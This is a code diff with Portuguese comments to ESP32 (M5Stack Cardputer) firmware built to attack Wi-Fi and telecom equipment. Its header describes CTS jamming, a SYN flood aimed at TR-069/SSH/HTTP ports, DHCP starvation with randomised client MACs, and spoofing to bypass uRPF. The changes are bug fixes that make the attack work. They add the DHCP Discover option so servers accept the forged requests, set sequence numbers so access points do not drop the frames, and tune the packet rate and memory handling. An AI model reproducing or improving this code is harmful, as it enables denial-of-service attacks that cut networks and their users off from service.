@@ -4,13 +4,8 @@
  * @hardware ESP32-S3 (M5Stack Cardputer) / ESP32 WROOM
  * @details
  * Firmware de injeção bare-metal focado em equipamentos de telecomunicações.
- * Funcionalidades ativas:
- * - CTS Jamming (Evasão WPA3)
- * - TCP SYN Flood Direcionado (TR-069, SSH, HTTP)
- * - DHCP Starvation (Esgotamento de Pool IP com CHADDR Dinâmico e Magic Cookie)
- * - uRPF Bypass (Spoofing Dinâmico de Sub-redes)
- * - Channel Pursuit (Perseguição automática de canais)
- * - Checksum Incremental RFC 1624 (Otimização Extrema de PPS na IRAM)
+ * CÓDIGO REFATORADO: Correções de DMA, Prevenção de Task Starvation, Alinhamento de Memória (Xtensa) 
+ * e conformidade RFC para DHCP e Checksums.
  */
 
 #include <M5Unified.h>
@@ -71,10 +66,7 @@ struct __attribute__((packed)) TcpHeader {
     uint16_t checksum; uint16_t urgent_ptr;
 };
 
-// [FIX] ALINHAMENTO DE MEMÓRIA (REMOÇÃO DA UNION):
-// Ao invés de uma "union", utilizamos um buffer contínuo (l4_and_payload) que 
-// permite o empacotamento exato de bytes na memória, garantindo que o rádio Wi-Fi
-// não adicione lixo (padding) de 12 bytes quando enviamos um frame UDP/DHCP.
+// Estrutura contínua sem padding para garantir injeção perfeita no rádio
 struct __attribute__((packed)) SilverBulletPacket {
     MacHeader mac;
     LlcSnapHeader llc;
@@ -132,7 +124,7 @@ const char* get_nome_modo() {
 }
 
 // ===================================================================
-// 3. MOTORES MATEMÁTICOS DE ALTA PERFORMANCE (RAM/IRAM)
+// 3. MOTORES MATEMÁTICOS DE ALTA PERFORMANCE E PREVENÇÃO DE CRASH
 // ===================================================================
 
 IRAM_ATTR inline uint32_t fast_rand() {
@@ -141,6 +133,7 @@ IRAM_ATTR inline uint32_t fast_rand() {
     return prng_state = x;
 }
 
+// Calcula o Checksum IPv4
 IRAM_ATTR inline uint16_t fast_ip_checksum(IpHeader *ip) {
     uint32_t acc = 0;
     uint16_t *data = (uint16_t *)ip;
@@ -149,21 +142,37 @@ IRAM_ATTR inline uint16_t fast_ip_checksum(IpHeader *ip) {
     return ~acc;
 }
 
+// [CORREÇÃO] Acesso a memória alinhada (Memcpy) para evitar "Unaligned Memory Access Exception"
 IRAM_ATTR inline uint16_t fast_l4_checksum(IpHeader *ip, void *l4_hdr, size_t l4_len, uint8_t *payload, size_t payload_len) {
     PseudoHeader psd;
     memcpy(psd.src_ip, ip->ip_src, 4); memcpy(psd.dest_ip, ip->ip_dest, 4);
     psd.reserved = 0; psd.protocol = ip->protocol; psd.l4_length = htons(l4_len + payload_len);
 
     uint32_t acc = 0;
+    uint16_t word;
+    
+    // Soma o PseudoHeader (seguro, memória já está alinhada na stack)
     uint16_t *ptr = (uint16_t *)&psd;
     for (int i = 0; i < sizeof(PseudoHeader)/2; i++) acc += ptr[i];
     
-    ptr = (uint16_t *)l4_hdr;
-    for (int i = 0; i < l4_len/2; i++) acc += ptr[i];
+    // Soma Header L4 (Usa memcpy para evitar travamento em arquitetura Xtensa)
+    uint8_t *l4_p = (uint8_t *)l4_hdr;
+    for (size_t i = 0; i < l4_len; i += 2) {
+        memcpy(&word, l4_p + i, 2);
+        acc += word;
+    }
 
-    ptr = (uint16_t *)payload;
-    for (size_t i = 0; i < payload_len / 2; ++i) acc += ptr[i];
-    if (payload_len & 1) { uint16_t word = 0; memcpy(&word, payload + payload_len - 1, 1); acc += word; }
+    // Soma Payload L7 (Também via memcpy byte-a-byte alinhado)
+    for (size_t i = 0; i < (payload_len & ~1); i += 2) {
+        memcpy(&word, payload + i, 2);
+        acc += word;
+    }
+    // Lida com payload de tamanho ímpar (padding zero implícito)
+    if (payload_len & 1) { 
+        word = 0; 
+        memcpy(&word, payload + payload_len - 1, 1); 
+        acc += word; 
+    }
 
     while (acc >> 16) acc = (acc & 0xffff) + (acc >> 16);
     return ~acc;
@@ -250,7 +259,7 @@ void task_display(void *pvParameters) {
                 float tsens_out = 0.0;
                 if (temp_sensor != NULL) temperature_sensor_get_celsius(temp_sensor, &tsens_out);
                 
-                // [FIX] THERMAL RECOVERY: Restaura o max power quando o rádio esfriar < 65ºC
+                // THERMAL RECOVERY: Restaura a potência automaticamente baseada na temperatura do silício
                 if (tsens_out > 75.0 && tx_power_max.load()) { 
                     tx_power_max.store(false); 
                     flag_update_config.store(true); 
@@ -328,7 +337,15 @@ void task_ataque(void *pvParameters) {
     AuthPacket* auth = (AuthPacket*) heap_caps_malloc(sizeof(AuthPacket), MALLOC_CAP_DMA);
     CtsPacket* cts = (CtsPacket*) heap_caps_malloc(sizeof(CtsPacket), MALLOC_CAP_DMA);
     
-    if (!pkt || !deauth || !auth || !cts) { erro_memoria_critico.store(true); vTaskDelete(NULL); }
+    // [CORREÇÃO] Memory Leak: Libera as alocações bem-sucedidas se alguma das outras falhar
+    if (!pkt || !deauth || !auth || !cts) { 
+        if(pkt) heap_caps_free(pkt);
+        if(deauth) heap_caps_free(deauth);
+        if(auth) heap_caps_free(auth);
+        if(cts) heap_caps_free(cts);
+        erro_memoria_critico.store(true); 
+        vTaskDelete(NULL); 
+    }
     
     prng_state = esp_random(); if (prng_state == 0) prng_state = 1; 
     
@@ -340,12 +357,12 @@ void task_ataque(void *pvParameters) {
     const uint16_t portas_gerencia[] = {80, 443, 22, 7547}; 
 
     bool config_radio_aplicada = false;
+    uint32_t iteracao_yield = 0;
 
     while (true) {
         if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load() && !scanner_pausa_ataque.load()) {
             
             if (!config_radio_aplicada || flag_update_config.load()) {
-                // [FIX] TX POWER CORRETO: 80 units = 20dBm | 40 units = 10dBm (ECO).
                 esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 40); 
                 esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
                 config_radio_aplicada = true; flag_update_config.store(false);
@@ -364,10 +381,11 @@ void task_ataque(void *pvParameters) {
 
             cts->frame_control = 0x00C4; cts->duration = 32767; memcpy(cts->mac_ra, mac_alvo, 6);
 
-            // [FIX] To DS=1 (0x0108). Exigência para o Kernel processar L3/L4 vindo de um cliente.
             pkt->mac.frame_control = 0x0108; 
             pkt->mac.duration = 0;
-            pkt->ip.version_ihl = 0x45; pkt->ip.ttl = 64; 
+            pkt->ip.version_ihl = 0x45; 
+            pkt->ip.ttl = 64; 
+            pkt->ip.tos = 0; // [CORREÇÃO] Zera o campo ToS para evitar corrupção lógica do header IPv4
 
             bool atirar_l2 = false, atirar_cts = false, atirar_l3 = false;
 
@@ -406,6 +424,9 @@ void task_ataque(void *pvParameters) {
                     bool is_tcp = (tipo_ataque < chance_tcp_syn); 
                     bool is_dhcp = (tipo_ataque >= chance_tcp_syn && tipo_ataque < (chance_tcp_syn + chance_dhcp));
 
+                    // [CORREÇÃO] Inserir Sequence Control válido também para Frames L3/L4 (Evita Replay Drop do AP)
+                    pkt->mac.seq_ctrl = (fast_rand() & 0xFFF) << 4;
+
                     memcpy(pkt->mac.mac_src, mac_alvo, 3); 
                     pkt->mac.mac_src[3] = fast_rand() & 0xFF; pkt->mac.mac_src[4] = fast_rand() & 0xFF; pkt->mac.mac_src[5] = fast_rand() & 0xFF;
 
@@ -418,7 +439,6 @@ void task_ataque(void *pvParameters) {
                     size_t t_injecao = 0;
                     
                     if (is_tcp) {
-                        // [FIX] Cast Lógico Dinâmico no Buffer DMA:
                         TcpHeader* tcp = (TcpHeader*)pkt->l4_and_payload;
                         uint8_t* payload = pkt->l4_and_payload + sizeof(TcpHeader);
                         size_t t_payload = 16 + (fast_rand() % 32); 
@@ -435,7 +455,6 @@ void task_ataque(void *pvParameters) {
                         t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(TcpHeader) + t_payload;
                         pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(TcpHeader) + t_payload);
                         
-                        // [FIX] ADDRESS TCP: O AP recebe e o AP é o destino lógico
                         memcpy(pkt->mac.mac_dest, mac_alvo, 6); 
                         memcpy(pkt->mac.mac_bssid, mac_alvo, 6);
                         
@@ -451,28 +470,32 @@ void task_ataque(void *pvParameters) {
                         
                         udp->src_port = htons(68); udp->dest_port = htons(67); 
                         
-                        memset(payload, 0, 240); // Limpa resíduos de pacotes TCP anteriores
+                        memset(payload, 0, 244); 
                         payload[0] = 0x01; payload[1] = 0x01; payload[2] = 0x06; payload[3] = 0x00; 
                         
-                        // [FIX] CHADDR: Injetar MAC Dinâmico para enganar DHCP e alocar IPs diferentes
                         for(int m = 0; m < 6; m++) {
                             payload[28 + m] = fast_rand() & 0xFF; 
                         }
 
-                        // [FIX] Magic Cookie Obrigatório para o DHCP Aceitar o pacote
+                        // Magic Cookie BOOTP Padrão
                         payload[236] = 0x63; payload[237] = 0x82; payload[238] = 0x53; payload[239] = 0x63;
                         
-                        t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader) + 240; 
-                        pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + 240);
-                        udp->length = htons(sizeof(UdpHeader) + 240);
+                        // [CORREÇÃO] Adicionando a Option 53 (Message Type = Discover) obrigatória para o dnsmasq ler o DHCP
+                        payload[240] = 53;   // Option 53: DHCP Message Type
+                        payload[241] = 1;    // Option Length: 1 Byte
+                        payload[242] = 1;    // Option Value: 1 (Discover)
+                        payload[243] = 255;  // End Option (0xFF)
                         
-                        // [FIX] ADDRESS DHCP (Broadcast L2): O AP (Address 1) recebe o sinal físico, 
-                        // mas a rede lógica inteira (Address 3) deve processar via Broadcast L2.
+                        // O Tamanho aumenta de 240 para 244 devido às opções DHCP
+                        t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader) + 244; 
+                        pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + 244);
+                        udp->length = htons(sizeof(UdpHeader) + 244);
+                        
                         memcpy(pkt->mac.mac_dest, mac_alvo, 6);
                         memcpy(pkt->mac.mac_bssid, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
                         
                         pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
-                        udp->checksum = 0; udp->checksum = fast_l4_checksum(&pkt->ip, udp, sizeof(UdpHeader), payload, 240);
+                        udp->checksum = 0; udp->checksum = fast_l4_checksum(&pkt->ip, udp, sizeof(UdpHeader), payload, 244);
                     }
                     else { 
                         UdpHeader* udp = (UdpHeader*)pkt->l4_and_payload;
@@ -495,14 +518,19 @@ void task_ataque(void *pvParameters) {
                     }
                     
                     if (esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_ERR_NO_MEM) { 
-                        vTaskDelay(pdMS_TO_TICKS(1)); 
-                        break; 
+                        break; // Sai do loop para desafogar a fila e tentar novamente depois
                     } else {
                         pacotes_enviados_segundo++;
                     }
                 }
             }
-            taskYIELD(); 
+            
+            // [CORREÇÃO] TASK STARVATION PREVENTION
+            // Substituído taskYIELD() genérico por um bloqueio forçado a cada ciclo para permitir o Wi-Fi Stack trabalhar
+            iteracao_yield++;
+            if (iteracao_yield % 20 == 0) { 
+                vTaskDelay(pdMS_TO_TICKS(1)); // Entrega exatamente 1 tick real ao sistema e tarefa IDLE
+            }
         } else {
             config_radio_aplicada = false; 
             vTaskDelay(pdMS_TO_TICKS(100)); 
